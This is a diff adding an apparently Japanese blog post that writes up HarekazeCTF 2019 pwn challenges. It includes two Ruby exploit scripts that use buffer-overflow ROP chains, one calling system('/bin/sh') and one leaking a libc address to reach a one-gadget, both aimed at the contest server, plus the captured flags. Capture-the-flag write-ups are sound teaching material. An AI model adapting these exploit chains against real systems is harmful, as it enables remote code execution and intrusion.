@@ -1,0 +1,174 @@
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    
+    Harekazectf2019 | $ make life
+    
+  </title>
+  
+  
+  <link rel="stylesheet" href="https://owlinux1000.github.io/blog/css/base.min.21688b64210142c045c9a1d930a48fc517f428060c78a3a012d71f971874c5c3.css" integrity="sha256-IWiLZCEBQsBFyaHZMKSPxRf0KAYMeKOgEtcflxh0xcM=">
+  
+  <meta name="generator" content="Hugo 0.53" />
+</head>
+<body>
+  <nav class="u-background">
+  <div class="u-wrapper">
+    <ul class="Banner">
+      <li class="Banner-item Banner-item--title">
+        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/">$ make life</a>
+      </li>
+      
+      <li class="Banner-item">
+        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/about/">About</a>
+      </li>
+      
+      <li class="Banner-item">
+        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/post/">Posts</a>
+      </li>
+      
+      <li class="Banner-item">
+        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/tags/">Tags</a>
+      </li>
+      
+      <li class="Banner-item">
+        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/categories/">Categories</a>
+      </li>
+      
+      <li class="Banner-item">
+        <a class="Banner-link u-clickable" href="https://owlinux1000.github.io/blog/index.xml">RSS</a>
+      </li>
+      
+    </ul>
+  </div>
+</nav>
+  <main>
+    <div class="u-wrapper">
+      <div class="u-padding">
+        
+
+<article>
+  <header class="Heading">
+  <h2 class="Heading-title">
+    <a class="Heading-link u-clickable" href="https://owlinux1000.github.io/blog/post/harekazectf2019/" rel="bookmark">Harekazectf2019</a>
+  </h2>
+  
+  <time datetime="2019-05-19T16:54:53&#43;09:00">
+    19 May, 2019
+  </time>
+  
+</header>
+  
+
+<h2 id="baby-rop-1">Baby ROP 1</h2>
+
+<ul>
+<li>バイナリ中で、<code>system</code> 関数使ってechoしており、Canary等もないBOFが起こるので、<code>pop rdi; ret</code> 使って<code>system(/bin/sh)</code> を呼ぶだけ
+```ruby
+#!/usr/bin/env ruby</li>
+</ul>
+
+<p>require &lsquo;pwn&rsquo;</p>
+
+<p>context.log_level = :debug
+z = Sock.new &ldquo;problem.harekaze.com&rdquo;, 20001</p>
+
+<p>pop_rdi_ret = p64(0x00400683)
+system = p64(0x4005e3)</p>
+
+<p>STDIN.gets
+z.recvuntil &ldquo;? &ldquo;
+payload = &ldquo;A&rdquo; * 24
+payload &lt;&lt; pop_rdi_ret
+payload &lt;&lt; p64(0x601048)
+payload &lt;&lt; system</p>
+
+<p>z.sendline payload</p>
+
+<p>z.interact</p>
+<div class="highlight"><pre style=";-moz-tab-size:4;-o-tab-size:4;tab-size:4">- **HarekazeCTF{r3turn_0r13nt3d_pr0gr4mm1ng_i5_3ss3nt141_70_pwn}**
+
+## Baby ROP 2
+
+- `system` 関数などは、存在しないが、libc が配布されているので、ROPでlibcアドレスリークして、One-Gagdet に飛ばすだけ
+```ruby
+#!/usr/bin/env ruby
+
+require &#39;pwn&#39;
+
+context.log_level = :debug
+z = Sock.new &#34;problem.harekaze.com&#34;, 20005
+#z = Sock.new &#34;localhost&#34;, 9999
+elf = ELF.new &#34;./babyrop2&#34;
+libc = ELF.new &#34;./libc.so.6&#34;
+#libc = ELF.new &#34;./mylibc.so.6&#34;
+
+pop_rdi_ret = p64(0x00400733)
+z.recvuntil &#34;? &#34;
+
+payload = &#34;A&#34; * 40
+payload &lt;&lt; pop_rdi_ret
+payload &lt;&lt; p64(elf.got[&#34;__libc_start_main&#34;])
+payload &lt;&lt; p64(0x4004f0)
+payload &lt;&lt; p64(elf.symbols[&#34;main&#34;])
+STDIN.gets
+z.sendline payload
+
+recvlen = &#34;Welcome to the Pwn World again, AAAAAAAAAAAAAAAAAAAAAAAAAAAAA!\n&#34;.length
+data = z.recvuntil &#34;? &#34;
+p data
+libc_base = u64(data[recvlen, 6].ljust(8, &#34;\x00&#34;)) - libc.symbols[&#34;__libc_start_main&#34;]
+libc_magic = libc_base + 0xf02a4
+puts &#34;libc base 0x%x&#34; % libc_base
+puts &#34;libc magic 0x%x&#34; % libc_magic
+
+payload = &#34;B&#34; * 40
+payload &lt;&lt; p64(libc_magic)
+z.sendline payload
+
+z.interact</pre></div>
+<ul>
+<li><strong>HarekazeCTF{u53_b55_53gm3nt_t0_pu7_50m37h1ng}</strong></li>
+</ul>
+
+<h2 id="login">Login</h2>
+
+<ul>
+<li>解けなかった、脆弱性わからず</li>
+</ul>
+
+<h2 id="harekaze-note">Harekaze Note</h2>
+
+<ul>
+<li>Note の削除時に何も考慮してないため、Heapアドレスのリークやdouble freeができるが、そこから攻撃に繋げられず</li>
+</ul>
+
+  
+</article>
+
+
+      </div>
+    </div>
+  </main>
+  
+<footer class="Footer">
+  <div class="u-wrapper">
+    <div class="u-padding">
+      Except where otherwise noted, content on this site is licensed under a <a href="http://creativecommons.org/licenses/by/4.0/" rel="license"> Creative Commons Attribution 4.0 International License</a>.
+    </div>
+  </div>
+</footer>
+
+  
+</body>
+</html>
